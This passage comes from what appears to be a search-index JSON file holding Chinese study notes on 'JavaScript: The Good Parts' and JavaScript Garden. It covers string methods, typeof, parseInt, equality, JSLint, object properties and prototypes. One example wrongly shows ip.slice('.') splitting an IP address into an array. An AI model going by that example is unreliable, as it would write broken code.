\u5c06\u5b57\u7b26\u4e32\u6309\u7167\u5206\u9694\u7b26\u5206\u5272\u6210\u7247\u6bb5\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u5b57\u7b26\u4e32\u6570\u7ec4\u3002limit\u8868\u793a\u5206\u5272\u7247\u6bb5\u7684\u6570\u91cf\u3002\u5206\u9694\u7b26\u53ef\u4ee5\u4f7f\u5b57\u7b26\u4e32\u6216\u8005\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u5982\u679c\u5206\u9694\u7b26\u662f\u7a7a\u5b57\u7b26\uff0c\u8fd4\u56de\u5355\u5b57\u7b26\u7684\u6570\u7ec4\u3002\n\nvar ip = '192.168.0.1';\nvar b = ip.slice('.'); // ['192', '168', '0', '1']\n\nstring.toLowerCase();\nstring.toUpperCase();\nstring.fromCharCode(char...); //\u6839\u636e\u6570\u5b57\u7f16\u7801\u521b\u5efa\u4e00\u4e2a\u5b57\u7b26\u4e32 \n\n\u622a\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u65b9\u6cd5\uff1a\u6700\u597d\u4f7f\u7528slice, \u4e0d\u8981\u4f7f\u7528substring \u56e0\u4e3a\u540e\u8005\u65e0\u6cd5\u4f7f\u7528\u8d1f\u6570\uff1b\n</code></pre>"},{"location":"other/JS-the-good-parts/#_19","title":"\u7b2c\u4e5d\u7ae0 \u4ee3\u7801\u98ce\u683c","text":"<p>JS \u5bf9\u4ee3\u7801\u683c\u5f0f\u8981\u6c42\u4e0d\u8981\uff0c\u5bb9\u9519\u6027\u5f88\u9ad8\uff0c\u8fd9\u6837\u53ef\u80fd\u9020\u6210bug\u3002\u591a\u5199\u4e00\u4e2a\u5927\u62ec\u53f7\u53ef\u80fd\u907f\u514dif\u7684\u4f5c\u7528\u8303\u56f4\u3002\u5199\u5408\u9002\u7684\u6ce8\u91ca\u5e76\u53ca\u65f6\u66f4\u65b0\u6ce8\u91ca(\u4ee3\u7801\u4f1a\u66f4\u65b0\uff0c\u6ce8\u91ca\u4e5f\u9700\u8981\u66f4\u65b0)\u3002\u8be6\u7ec6\u7684\u4ee3\u7801\u98ce\u683c\u53ef\u4ee5\u53c2\u8003\u300a\u4ee3\u7801\u6574\u6d01\u4e4b\u9053\u300b\u8fd9\u672c\u4e66\u3002</p>"},{"location":"other/JS-the-good-parts/#_20","title":"\u7b2c\u5341\u7ae0 \u4f18\u7f8e\u7684\u7279\u6027","text":"<p>\u51fd\u6570\u662f\u9876\u7ea7\u5bf9\u8c61</p> <p>\u51fd\u6570\u5177\u6709\u8bcd\u6cd5\u4f5c\u7528\u57df\u7684\u95ed\u5305(lambda)</p> <p>\u57fa\u4e8e\u539f\u578b\u7ee7\u627f\u7684\u52a8\u6001\u5bf9\u8c61</p> <p>\u5bf9\u8c61\u662f\u65e0\u7c7b\u522b\u7684\u3002\u4e00\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u901a\u8fc7\u666e\u901a\u7684\u8d4b\u503c\u589e\u52a0\u4e00\u4e2a\u65b0\u6210\u5458\u5c5e\u6027\uff1b\u4e00\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u4ece\u53e6\u4e00\u4e2a\u5bf9\u8c61\u7ee7\u627f\u6210\u5458\u5c5e\u6027\u3002</p> <p>\u5bf9\u8c61\u5b57\u9762\u91cf\u548c\u6570\u7ec4\u5b57\u9762\u91cf</p> <p>\u4fbf\u6377\u7684\u521b\u5efa\u5bf9\u8c61\u548c\u6570\u7ec4(\u6765\u6e90\u4e8eJSON)</p>"},{"location":"other/JS-the-good-parts/#a","title":"\u9644\u5f55A \u6bd2\u7624","text":""},{"location":"other/JS-the-good-parts/#_21","title":"\u5168\u5c40\u53d8\u91cf","text":"<p>\u5168\u5c40\u53d8\u91cf\u53ef\u80fd\u9020\u6210\u5185\u5b58\u6cc4\u6f0f\uff1b\u5927\u578b\u7a0b\u5e8f\u4e2d\u53ef\u80fd\u548c\u53e6\u4e00\u4e2a\u53d8\u91cf\u540d\u51b2\u7a81\uff1b\u53ef\u4ee5\u88ab\u7a0b\u5e8f\u7684\u4efb\u4f55\u90e8\u5206\u5728\u4efb\u4f55\u65f6\u95f4\u4fee\u6539(\u964d\u4f4e\u4e86\u7a0b\u5e8f\u7684\u53ef\u9760\u6027)</p> <p>\u5b9a\u4e49\u5168\u5c40\u53d8\u91cf\u7684\u4e09\u79cd\u65b9\u6cd5\uff1a\u5728\u51fd\u6570\u5916\u90e8\u4f7f\u7528 var foo = value; \u7ed9\u5168\u5c40\u5bf9\u8c61window\u589e\u52a0\u4e00\u4e2a\u5c5e\u6027 window.foo = value; \u4f7f\u7528\u672a\u58f0\u660e\u7684\u53d8\u91cf(\u9690\u5f0f\u5168\u5c40\u53d8\u91cf\uff0c\u4f1a\u9020\u6210\u5f88\u5927\u7684\u9ebb\u70e6)</p>"},{"location":"other/JS-the-good-parts/#_22","title":"\u4f5c\u7528\u57df","text":"<p>JS\u5177\u6709\u4ee3\u7801\u5757\uff0c\u4f46\u662f\u6ca1\u6709\u5757\u7ea7\u4f5c\u7528\u57df\u3002\u5176\u4ed6\u8bed\u8a00\u4e2d\uff0c\u58f0\u660e\u53d8\u91cf\u5728\u7b2c\u4e00\u6b21\u4f7f\u7528\u662f\uff0c\u5728JS\u4e2d\u53ef\u4ee5\u5728\u6bcf\u4e2a\u51fd\u6570\u5f00\u5934\u90e8\u5206\u58f0\u660e\u53d8\u91cf\u3002</p>"},{"location":"other/JS-the-good-parts/#_23","title":"\u81ea\u52a8\u63d2\u5165\u5206\u53f7","text":"<p>\u5982\u679creturn\u540e\u6ca1\u6709\u52a0\u5206\u53f7\uff0c\u5c31\u4f1a\u81ea\u52a8\u589e\u52a0\u5206\u53f7 return; \u8fd4\u56de\u4e00\u4e2aundefined</p>"},{"location":"other/JS-the-good-parts/#typeof","title":"typeof","text":"<p>typeof(null) =&gt; Object \u6240\u4ee5\u4e0d\u80fd\u7528\u8fd9\u79cd\u65b9\u6cd5\u68c0\u6d4bnull</p> <p>\u53ef\u4ee5\u4f7f\u7528 null === null (true) \u68c0\u6d4bnull</p> <p>\u5bf9\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5927\u90e8\u5206\u6d4f\u89c8\u5668\u8fd4\u56de object</p>"},{"location":"other/JS-the-good-parts/#parseint","title":"parseInt","text":"<p>parseInt \u4f1a\u628a\u5b57\u7b26\u4e32\u8f6c\u5316\u6210\u6574\u6570\uff0c\u5982\u679c\u9047\u5230\u975e\u5b57\u7b26\u5c31\u4f1a\u505c\u6b62\u89e3\u6790\u3002parseInt('16 tons') =&gt; 16.</p> <p>s\u5982\u679c\u9047\u5230\u7684\u5b57\u7b26\u4e32\u7b2c\u4e00\u4e2a\u662f0\uff0cparseInt \u4f1a\u6309\u7167\u516b\u8fdb\u5236\u8f6c\u6362\uff0c\u8fd9\u53ef\u80fd\u9020\u6210\u9519\u8bef\u3002</p> <p>parseInt('089') =&gt; 0</p> <p>\u89e3\u51b3 parseInt('089', 10) =&gt; 89 \u6309\u7167\u5341\u8fdb\u5236\u8fdb\u884c\u8f6c\u5316\u3002</p>"},{"location":"other/JS-the-good-parts/#_24","title":"\u52a0\u6cd5","text":"<p>\u786e\u4fdd\u52a0\u6cd5\u7684\u4e24\u4e2a\u6570\u90fd\u662f\u6574\u6570\u3002\u5982\u679c\u8ba1\u7b97\u8d27\u5e01\u9700\u8981\u5706\u89d2\u5206\uff0c\u9700\u8981\u5148\u8f6c\u5316\u6210\u5206\u8fdb\u884c\u8ba1\u7b97(\u4e4b\u540e\u518d\u8fd8\u539f\u6210\u5143)\u3002</p>"},{"location":"other/JS-the-good-parts/#nan","title":"NaN","text":"<p>\u8ba1\u7b97\u9519\u8bef\u4f1a\u4ea7\u751fNaN\u3002\u5982\u679c\u4e00\u4e2a\u8ba1\u7b97\u7ed3\u679c\u662fNaN\uff0c\u90a3\u4e48\u53ef\u80fd\u8f93\u5165\u9879\u6216\u8005\u8ba1\u7b97\u8fc7\u7a0b\u4e2d\u4ea7\u751f\u4e86NaN\u3002\u53ef\u4ee5\u4f7f\u7528 isNaN \u5224\u65ad\u3002</p> <pre><code>isNaN('oop'); //true\nisNaN('0'); //false\n</code></pre>"},{"location":"other/JS-the-good-parts/#_25","title":"\u4f2a\u6570\u7ec4","text":"<p>JS \u4e2d\u7684\u6570\u7ec4\u5b9e\u9645\u4e0a\u662f\u5bf9\u8c61\u3002\u4e0d\u9700\u8981\u8003\u8651\u8d8a\u754c\u7684\u95ee\u9898\uff0c\u4f46\u662f\u6027\u80fd\u6bd4C\u8bed\u8a00\u4e2d\u7684\u6570\u7ec4\u5dee\u5f88\u591a\u3002\u5224\u65ad\u6570\u636e\u4e0d\u80fd\u4f7f\u7528 typeof\uff0c\u9700\u8981\u5224\u65ad constructor.</p> <pre><code>if (my_value &amp;&amp; typeof(my_value) === 'object' &amp;&amp; my_value.constructor === Array) {\n  console.log('parameter is an array');\n}\n</code></pre> <p>\u51fd\u6570\u53c2\u6570\u6784\u6210\u4f2a\u6570\u7ec4 arguments \u4e0d\u662f\u4e00\u4e2a\u6570\u636e\uff0c\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5177\u6709 length \u5c5e\u6027\u3002</p> <p>hasOwnProperty \u662f\u5bf9\u8c61\u7684\u4e00\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5224\u65ad\u5bf9\u8c61\u5185\u90e8\u662f\u5426\u6709\u4e00\u4e2a\u952e\uff1b\u4f46\u662f\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u88ab\u66f4\u6539(object.hasOwnProperty = null;)\uff0c\u6b64\u65f6\u5c31\u4f1a\u51fa\u9519\u3002</p>"},{"location":"other/JS-the-good-parts/#b","title":"\u9644\u5f55B \u7cdf\u7c95","text":"<p>\u907f\u514d\u4f7f\u7528 ==</p> <p>\u4e24\u4e2a\u7b49\u53f7\u6bd4\u8f83\u65f6\uff0c\u5982\u679c\u53d8\u91cf\u7c7b\u578b\u4e0d\u540c\u4f1a\u5f3a\u5236\u8f6c\u6362\uff0c\u8fd9\u4e9b\u89c4\u5219\u5f88\u590d\u6742\u3002\u6240\u4ee5\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u4e24\u4e2a\u7b49\u53f7\uff0c\u6700\u597d\u4f7f\u7528\u4e09\u4e2a\u7b49\u53f7\u3002</p> <pre><code>'' == '0' //false\n0 == '' // true\n0 == '0' // true\n</code></pre> <p>\u907f\u514d\u4f7f\u7528 with \u8bed\u53e5</p> <p>\u907f\u514d\u4f7f\u7528 eval \u8bed\u53e5</p> <p>\u907f\u514d\u5728\u51fd\u6570\u53c2\u6570\u4e2d\u4f20\u9012\u5b57\u7b26\u4e32</p> <p>\u51cf\u5c11\u4f7f\u7528 continue</p> <p>\u51cf\u5c11\u4f7f\u7528 switch_case \u7a7f\u8d8a(\u4e24\u79cd\u60c5\u51b5\u5bf9\u5e94\u4e00\u4e2a\u7ed3\u679c\uff0c\u4e0d\u5199 return \u8bed\u53e5\u3002)\u8fd9\u6837\u5728 JSLint\u76d1\u6d4b\u6548\u679c\u4e0d\u597d</p> <p>\u5c3d\u91cf\u4f7f\u7528\u4ee3\u7801\u5757(if while) \u907f\u514d\u56e0\u4e3a\u6362\u884c\u7a0b\u5e8f\u9519\u8bef\u3002\u56e0\u4e3aJS\u4e2d\u7a7a\u683c\u4e0d\u4e25\u683c\u9650\u5236\u3002</p>"},{"location":"other/JS-the-good-parts/#c-jslint","title":"\u9644\u5f55C JSlint","text":"<p>\u4f7f\u7528 JSLint \u53ef\u4ee5\u51cf\u5c11\u9519\u8bef\u53d1\u751f(\u4ee3\u7801\u884c\u672b\u52a0\u5165\u5206\u53f7\u7b49\uff0c\u907f\u514d\u8bed\u53e5\u9519\u8bef)</p> <p>\u4f7f\u7528 ++ \u2014 \u907f\u514d\u5728\u524d\u9762\u5199\u7a7a\u683c\uff0c\u56e0\u4e3a\u53ef\u80fd\u9020\u6210 + + \u8fd9\u6837\u7684\u9519\u8bef</p> <p>\u5728\u9009\u62e9\u7ed3\u6784\u4e2d\uff0cJSLint\u4e0d\u5e0c\u671b\u51fa\u73b0\u8d4b\u503c\u8bed\u53e5\u3002\u56e0\u4e3a\u53ef\u80fd\u662f\u6bd4\u8f83\u8bed\u53e5(a == b) \u5c11\u5199\u4e86\u4e00\u4e2a\u7b49\u53f7\u9020\u6210\u7684\u8d4b\u503c\u8bed\u53e5\u3002</p> <p>\u53ef\u4ee5\u907f\u514d\u5f88\u591a\u8bed\u6cd5\u95ee\u9898\u9020\u6210\u7684\u6f5c\u5728\u7684bug\u3002</p> <p>\u8fd9\u4e00\u70b9\u5bf9\u4e8e\u81ea\u5df1\u5f88\u6709\u7528\u3002\u5728\u81ea\u5df1\u7684\u9879\u76ee\u4e2d\u6700\u597d\u53ef\u4ee5\u8fd9\u4e2a\u5e93\u3002</p>"},{"location":"other/JS-the-good-parts/#json","title":"\u9644\u5f55 JSON","text":"<p>JSON \u4e3b\u8981\u7528\u4e8e\u4e0d\u540c\u8bed\u8a00\u6570\u636e\u4ea4\u6362\u3002</p> <p>JSON \u5bf9\u8c61\u53ef\u4ee5\u88ab\u63d2\u5165\u4efb\u4f55\u6570\u636e\u7c7b\u578b\u7684\u503c\uff0c\u5bf9\u8c61\u53ef\u4ee5\u65e0\u9650\u5c42\u6b21\u7684\u5d4c\u5957\u3002\u4f46\u662f\u6700\u597d\u7684\u529e\u6cd5\u662f\u6241\u5e73\u7684\u6570\u636e\u3002\u5176\u4ed6\u8bed\u8a00\u5177\u6709\u6620\u5c04\u6210JSON\u5bf9\u8c61\u7684\u6570\u636e\u7c7b\u578b\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 eval \u51fd\u6570\u628a\u6587\u672c\u5b57\u7b26\u4e32\u8f6c\u5316\u6210\u4e00\u4e2a\u6709\u7528\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u6cd5\u5b58\u5728\u98ce\u9669\u3002</p> <p>\u66ff\u4ee3\u7684\u65b9\u6cd5\u662f JSON.parse \u5982\u679c\u5185\u90e8\u5305\u542b\u4e00\u4e2a\u5371\u9669\u7684\u6570\u636e\uff0c\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002</p> <p>\u672c\u4e66\u7b14\u8bb0\u5b8c</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/","title":"JavaScript \u79d8\u5bc6\u82b1\u56ed","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 63221  \u9605\u8bfb127\u5206\u949f</p> <p>\u539f\u6587\u539f\u59cb\u94fe\u63a5</p> <p>http://bonsaiden.github.io/JavaScript-Garden/</p> <p>\u539f\u6587\u662f\u82f1\u6587\uff0c\u7ffb\u8bd1\u540e\u7684\u4e2d\u6587\u53ef\u80fd\u6709\u4e00\u90e8\u5206\u4e0d\u51c6\u786e\u3002\u8fd9\u91cc\u4e3b\u8981\u653e\u81ea\u5df1\u7684\u7b14\u8bb0\uff0c\u800c\u4e0d\u662f\u5b8c\u6574\u7684\u539f\u4e66\u5185\u5bb9\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_1","title":"\u5bf9\u8c61","text":""},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_2","title":"\u5bf9\u8c61\u4f7f\u7528\u548c\u5c5e\u6027","text":"<p>JavaScript \u4e2d\u6240\u6709\u53d8\u91cf\u90fd\u53ef\u4ee5\u5f53\u4f5c\u5bf9\u8c61\u4f7f\u7528\uff0c\u9664\u4e86\u4e24\u4e2a\u4f8b\u5916 <code>null</code> \u548c <code>undefined</code>\u3002</p> <pre><code>false.toString(); // 'false'\n[1, 2, 3].toString(); // '1,2,3'\n\nfunction Foo(){}\nFoo.bar = 1;\nFoo.bar; // 1\n</code></pre> <p>\u4e00\u4e2a\u5e38\u89c1\u7684\u8bef\u89e3\u662f\u6570\u5b57\u7684\u5b57\u9762\u503c\uff08literal\uff09\u4e0d\u80fd\u5f53\u4f5c\u5bf9\u8c61\u4f7f\u7528\u3002\u8fd9\u662f\u56e0\u4e3a JavaScript \u89e3\u6790\u5668\u7684\u4e00\u4e2a\u9519\u8bef\uff0c \u5b83\u8bd5\u56fe\u5c06_\u70b9\u64cd\u4f5c\u7b26_\u89e3\u6790\u4e3a\u6d6e\u70b9\u6570\u5b57\u9762\u503c\u7684\u4e00\u90e8\u5206\u3002</p> <pre><code>2.toString(); // \u51fa\u9519\uff1aSyntaxError\n</code></pre> <p>\u6709\u5f88\u591a\u53d8\u901a\u65b9\u6cd5\u53ef\u4ee5\u8ba9\u6570\u5b57\u7684\u5b57\u9762\u503c\u770b\u8d77\u6765\u50cf\u5bf9\u8c61\uff08\u5b9e\u9645\u4e0a\u907f\u514d\u8fd9\u6837\u7684\u8bed\u6cd5\uff0c\u53ef\u8bfb\u6027\u4e0d\u5f3a\uff09\u3002</p> <pre><code>2..toString(); // \u7b2c\u4e8c\u4e2a\u70b9\u53f7\u53ef\u4ee5\u6b63\u5e38\u89e3\u6790\n2 .toString(); // \u6ce8\u610f\u70b9\u53f7\u524d\u9762\u7684\u7a7a\u683c\n(2).toString(); // 2\u5148\u88ab\u8ba1\u7b97\n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_3","title":"\u5bf9\u8c61\u4f5c\u4e3a\u6570\u636e\u7c7b\u578b","text":"<p>JavaScript \u7684\u5bf9\u8c61\u53ef\u4ee5\u4f5c\u4e3a_\u54c8\u5e0c\u8868_\u4f7f\u7528\uff0c\u4e3b\u8981\u7528\u6765\u4fdd\u5b58\u547d\u540d\u7684\u952e\u4e0e\u503c\u7684\u5bf9\u5e94\u5173\u7cfb\u3002</p> <p>\u4f7f\u7528\u5bf9\u8c61\u7684\u5b57\u9762\u8bed\u6cd5 - <code>{}</code> - \u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7b80\u5355\u5bf9\u8c61\u3002\u8fd9\u4e2a\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u4ece <code>Object.prototype</code> \u7ee7\u627f\u4e0b\u9762\uff0c\u6ca1\u6709\u4efb\u4f55\u81ea\u5b9a\u4e49\u5c5e\u6027\u3002</p> <pre><code>var foo = {}; // \u4e00\u4e2a\u7a7a\u5bf9\u8c61\n\n// \u4e00\u4e2a\u65b0\u5bf9\u8c61\uff0c\u62e5\u6709\u4e00\u4e2a\u503c\u4e3a12\u7684\u81ea\u5b9a\u4e49\u5c5e\u6027'test'\nvar bar = {test: 12}; \n</code></pre>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_4","title":"\u8bbf\u95ee\u5c5e\u6027","text":"<p>\u6709\u4e24\u79cd\u65b9\u5f0f\u6765\u8bbf\u95ee\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u70b9\u64cd\u4f5c\u7b26\u6216\u8005\u4e2d\u62ec\u53f7\u64cd\u4f5c\u7b26\u3002</p> <pre><code>var foo = {name: 'michael'}\nfoo.name; // michael\nfoo['name']; // michael\n\nvar get = 'name';\nfoo[get]; // michael\n\nfoo.1234; // SyntaxError\nfoo['1234']; // works\n</code></pre> <p>\u4e24\u79cd\u8bed\u6cd5\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u662f\u4e2d\u62ec\u53f7\u64cd\u4f5c\u7b26\u5728\u4e0b\u9762\u4e24\u79cd\u60c5\u51b5\u4e0b\u4f9d\u7136\u6709\u6548</p> <ul> <li>\u52a8\u6001\u8bbe\u7f6e\u5c5e\u6027</li> <li>\u5c5e\u6027\u540d\u4e0d\u662f\u4e00\u4e2a\u6709\u6548\u7684\u53d8\u91cf\u540d\uff08**\u8bd1\u8005\u6ce8\uff1a**\u6bd4\u5982\u5c5e\u6027\u540d\u4e2d\u5305\u542b\u7a7a\u683c\uff0c\u6216\u8005\u5c5e\u6027\u540d\u662f JS \u7684\u5173\u952e\u8bcd\uff09</li> </ul> <p>**\u8bd1\u8005\u6ce8\uff1a**\u5728 JSLint \u8bed\u6cd5\u68c0\u6d4b\u5de5\u5177\u4e2d\uff0c\u70b9\u64cd\u4f5c\u7b26\u662f\u63a8\u8350\u505a\u6cd5\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_5","title":"\u5220\u9664\u5c5e\u6027","text":"<p>\u5220\u9664\u5c5e\u6027\u7684\u552f\u4e00\u65b9\u6cd5\u662f\u4f7f\u7528 <code>delete</code> \u64cd\u4f5c\u7b26\uff1b\u8bbe\u7f6e\u5c5e\u6027\u4e3a <code>undefined</code> \u6216\u8005 <code>null</code> \u5e76\u4e0d\u80fd\u771f\u6b63\u7684\u5220\u9664\u5c5e\u6027\uff0c \u800c**\u4ec5\u4ec5**\u662f\u79fb\u9664\u4e86\u5c5e\u6027\u548c\u503c\u7684\u5173\u8054\u3002</p> <pre><code>var obj = {\n    bar: 1,\n    foo: 2,\n    baz: 3\n};\nobj.bar = undefined;\nobj.foo = null;\ndelete obj.baz;\n\nfor(var i in obj) {\n    if (obj.hasOwnProperty(i)) {\n        console.log(i, '' + obj[i]);\n    }\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u8f93\u51fa\u7ed3\u679c\u6709 <code>bar undefined</code> \u548c <code>foo null</code> - \u53ea\u6709 <code>baz</code> \u88ab\u771f\u6b63\u7684\u5220\u9664\u4e86\uff0c\u6240\u4ee5\u4ece\u8f93\u51fa\u7ed3\u679c\u4e2d\u6d88\u5931\u3002</p> <p>delete \u64cd\u4f5c\u7b26\u7c7b\u4f3c\u76f4\u63a5\u5220\u9664\u6307\u9488\uff1bundefined \u6216\u8005 null \u7c7b\u4f3c\u5bf9\u8c61\u7684\u6307\u9488\u6307\u5411\u7a7a\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_6","title":"\u5c5e\u6027\u540d\u7684\u8bed\u6cd5","text":"<pre><code>var test = {\n    'case': 'I am a keyword so I must be notated as a string',\n    delete: 'I am a keyword too so me' // \u51fa\u9519\uff1aSyntaxError\n};\n</code></pre> <p>\u5bf9\u8c61\u7684\u5c5e\u6027\u540d\u53ef\u4ee5\u4f7f\u7528\u5b57\u7b26\u4e32\u6216\u8005\u666e\u901a\u5b57\u7b26\u58f0\u660e\u3002\u4f46\u662f\u7531\u4e8e JavaScript \u89e3\u6790\u5668\u7684\u53e6\u4e00\u4e2a\u9519\u8bef\u8bbe\u8ba1\uff0c \u4e0a\u9762\u7684\u7b2c\u4e8c\u79cd\u58f0\u660e\u65b9\u5f0f\u5728 ECMAScript 5 \u4e4b\u524d\u4f1a\u629b\u51fa <code>SyntaxError</code> \u7684\u9519\u8bef\u3002</p> <p>\u8fd9\u4e2a\u9519\u8bef\u7684\u539f\u56e0\u662f <code>delete</code> \u662f JavaScript \u8bed\u8a00\u7684\u4e00\u4e2a_\u5173\u952e\u8bcd_\uff1b\u56e0\u6b64\u4e3a\u4e86\u5728\u66f4\u4f4e\u7248\u672c\u7684 JavaScript \u5f15\u64ce\u4e0b\u4e5f\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c \u5fc5\u987b\u4f7f\u7528_\u5b57\u7b26\u4e32\u5b57\u9762\u503c_\u58f0\u660e\u65b9\u5f0f\uff08\u5b9e\u9645\uff1a\u4e0d\u8981\u4f7f\u7528\u5173\u952e\u5b57\u4f5c\u4e3a\u53d8\u91cf\u5c5e\u6027\u540d\uff09\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_7","title":"\u539f\u578b","text":"<p>JavaScript \u4e0d\u5305\u542b\u4f20\u7edf\u7684\u7c7b\u7ee7\u627f\u6a21\u578b\uff0c\u800c\u662f\u4f7f\u7528 prototype \u539f\u578b\u6a21\u578b\u3002</p> <p>\u867d\u7136\u8fd9\u7ecf\u5e38\u88ab\u5f53\u4f5c\u662f JavaScript \u7684\u7f3a\u70b9\u88ab\u63d0\u53ca\uff0c\u5176\u5b9e\u57fa\u4e8e\u539f\u578b\u7684\u7ee7\u627f\u6a21\u578b\u6bd4\u4f20\u7edf\u7684\u7c7b\u7ee7\u627f\u8fd8\u8981\u5f3a\u5927\u3002 \u5b9e\u73b0\u4f20\u7edf\u7684\u7c7b\u7ee7\u627f\u6a21\u578b\u662f\u5f88\u7b80\u5355\uff0c\u4f46\u662f\u5b9e\u73b0 JavaScript \u4e2d\u7684\u539f\u578b\u7ee7\u627f\u5219\u8981\u56f0\u96be\u7684\u591a\u3002 (It is for example fairly trivial to build a classic model on top of it, while the other way around is a far more difficult task.)</p> <p>\u7531\u4e8e JavaScript \u662f\u552f\u4e00\u4e00\u4e2a\u88ab\u5e7f\u6cdb\u4f7f\u7528\u7684\u57fa\u4e8e\u539f\u578b\u7ee7\u627f\u7684\u8bed\u8a00\uff0c\u6240\u4ee5\u7406\u89e3\u4e24\u79cd\u7ee7\u627f\u6a21\u5f0f\u7684\u5dee\u5f02\u662f\u9700\u8981\u4e00\u5b9a\u65f6\u95f4\u7684\u3002</p> <p>\u7b2c\u4e00\u4e2a\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e JavaScript \u4f7f\u7528_\u539f\u578b\u94fe_\u7684\u7ee7\u627f\u65b9\u5f0f\u3002</p> <p>\u6ce8\u610f: \u7b80\u5355\u7684\u4f7f\u7528 <code>Bar.prototype = Foo.prototype</code> \u5c06\u4f1a\u5bfc\u81f4\u4e24\u4e2a\u5bf9\u8c61\u5171\u4eab**\u76f8\u540c**\u7684\u539f\u578b\u3002 \u56e0\u6b64\uff0c\u6539\u53d8\u4efb\u610f\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\u90fd\u4f1a\u5f71\u54cd\u5230\u53e6\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b\uff0c\u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u8fd9\u4e0d\u662f\u5e0c\u671b\u7684\u7ed3\u679c\u3002</p> <pre><code>function Foo() {\n    this.value = 42;\n}\nFoo.prototype = {\n    method: function() {}\n};\n\nfunction Bar() {}\n\n// \u8bbe\u7f6eBar\u7684prototype\u5c5e\u6027\u4e3aFoo\u7684\u5b9e\u4f8b\u5bf9\u8c61\nBar.prototype = new Foo();\nBar.prototype.foo = 'Hello World';\n\n// \u4fee\u6b63Bar.prototype.constructor\u4e3aBar\u672c\u8eab\nBar.prototype.constructor = Bar;\n\nvar test = new Bar() // \u521b\u5efaBar\u7684\u4e00\u4e2a\u65b0\u5b9e\u4f8b\n\n// \u539f\u578b\u94fe\ntest [Bar\u7684\u5b9e\u4f8b]\n    Bar.prototype [Foo\u7684\u5b9e\u4f8b] \n        { foo: 'Hello World' }\n        Foo.prototype\n            {method: ...};\n            Object.prototype\n                {toString: ... /* etc. */};\n</code></pre> <p>\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c<code>test</code> \u5bf9\u8c61\u4ece <code>Bar.prototype</code> \u548c <code>Foo.prototype</code> \u7ee7\u627f\u4e0b\u6765\uff1b\u56e0\u6b64\uff0c \u5b83\u80fd\u8bbf\u95ee <code>Foo</code> \u7684\u539f\u578b\u65b9\u6cd5 <code>method</code>\u3002\u540c\u65f6\uff0c\u5b83\u4e5f\u80fd\u591f\u8bbf\u95ee**\u90a3\u4e2a**\u5b9a\u4e49\u5728\u539f\u578b\u4e0a\u7684 <code>Foo</code> \u5b9e\u4f8b\u5c5e\u6027 <code>value</code>\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f <code>new Bar()</code> **\u4e0d\u4f1a**\u521b\u9020\u51fa\u4e00\u4e2a\u65b0\u7684 <code>Foo</code> \u5b9e\u4f8b\uff0c\u800c\u662f \u91cd\u590d\u4f7f\u7528\u5b83\u539f\u578b\u4e0a\u7684\u90a3\u4e2a\u5b9e\u4f8b\uff1b\u56e0\u6b64\uff0c\u6240\u6709\u7684 <code>Bar</code>\u5b9e\u4f8b\u90fd\u4f1a\u5171\u4eab**\u76f8\u540c**\u7684 <code>value</code> \u5c5e\u6027\u3002</p> <p>\u6ce8\u610f: **\u4e0d\u8981**\u4f7f\u7528 <code>Bar.prototype = Foo</code>\uff0c\u56e0\u4e3a\u8fd9\u4e0d\u4f1a\u6267\u884c <code>Foo</code> \u7684\u539f\u578b\uff0c\u800c\u662f\u6307\u5411\u51fd\u6570 <code>Foo</code>\u3002 \u56e0\u6b64\u539f\u578b\u94fe\u5c06\u4f1a\u56de\u6eaf\u5230 <code>Function.prototype</code> \u800c\u4e0d\u662f <code>Foo.prototype</code>\uff0c\u56e0\u6b64 <code>method</code> \u5c06\u4e0d\u4f1a\u5728 Bar \u7684\u539f\u578b\u94fe\u4e0a\u3002</p>"},{"location":"other/JavaScript%20%E7%A7%98%E5%AF%86%E8%8A%B1%E5%9B%AD-zh/#_8","title":"\u5c5e\u6027\u67e5\u627e","text":"<p>\u5f53\u67e5\u627e\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u65f6\uff0cJavaScript 